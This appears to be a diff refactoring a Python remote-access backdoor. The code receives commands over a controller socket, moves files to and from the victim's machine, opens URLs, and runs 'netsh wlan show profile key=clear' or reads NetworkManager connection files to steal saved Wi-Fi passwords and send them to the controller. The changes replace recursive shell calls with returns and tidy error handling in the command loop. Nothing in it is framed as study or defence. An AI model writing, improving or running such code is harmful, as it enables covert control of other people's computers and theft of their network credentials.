@@ -55,7 +55,7 @@ def upload(cmd):
          except(KeyboardInterrupt,EOFError):
           filee.close()
           controler.send(b":Aborted:")
-          shell(config=0)
+          return
        controler.send(b":DONE:")
 
 def wifishow():
@@ -63,10 +63,8 @@ def wifishow():
     if platform.system() == "Windows": info = runCMD("netsh wlan show profile name=* key=clear")
     elif platform.system() == "Linux": info = runCMD("egrep -h -s -A 9 --color -T 'ssid=' /etc/NetworkManager/system-connections/*")
     else: info = b":osnot:"
-  except Exception:
-     info = b":osnot:"
-  controler.send(info)
-
+  except Exception: info = b":osnot:"
+  finally: controler.send(info)
 def download(cmd):
      filetodown = "".join(cmd.split(":upload")).strip()
      filetodown = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[-1] if "\\" in filetodown else filetodown
@@ -77,7 +75,7 @@ def download(cmd):
       elif data == b":Aborted:":
         wf.close()
         os.remove(filetodown)
-        shell(config=0)
+        return
       wf.write(data)
      wf.close()
      controler.send(str(os.getcwd()+os.sep+filetodown).encode("UTF-8"))
@@ -86,15 +84,12 @@ def browse(cmd):
     url = "".join(cmd.split(":browse")).strip()
     browser.open(url)
 
-def shell(senrev=senrev,config=1):
-   if config==1:
-    global s
-    global controler
-    global mainDIR
-    global tmpdir
-    mainDIR = os.getcwd()
-    tmpdir = os.getcwd()
-    controler = senrev(s)
+def shell(senrev=senrev):
+   global s
+   global controler
+   mainDIR = os.getcwd()
+   tmpdir = os.getcwd()
+   controler = senrev(s)
    while True:
      cmd = controler.recv()
      if cmd.strip():
